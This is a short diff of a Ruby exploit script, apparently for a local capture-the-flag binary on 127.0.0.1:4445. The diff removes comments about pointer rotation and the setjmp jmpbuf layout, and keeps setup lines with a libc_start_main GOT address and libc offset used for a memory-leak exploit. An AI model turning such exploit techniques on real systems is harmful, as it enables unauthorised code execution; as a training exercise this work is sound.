@@ -1,8 +1,6 @@
 #!/usr/bin/env ruby
 require '~/pwnlib.rb'
 require 'bit-twiddle/core_ext'
-#=> true
-#irb(main):002:0> 0xe0a0272685424bed.rrot64(0x11)
 
 host, port = '127.0.0.1', 4445
 
@@ -46,16 +44,6 @@ def p64(*addr)
 	return addr.pack("Q*")
 end
 PwnTube.open(host, port) do |r|
-	# setjmp ant longjmp 
-	# will set conf in heap need leak it
-	# struct jmpbuf {
-	# /* 00 */    long rbx,
-	# /* 08 */         rbp_s,
-	# /* 10 */         r12, r13,
-	# /* 20 */         r14, r15,
-	# /* 30 */         rsp_s, rip_s;
-	# /* 40 */         from_sigprocmask, a_bit;
-	# };
 	@r = r
 	libc_start_main_got = 0x601fb0
 	libc_start_main_offset = 0x0000000000021a20
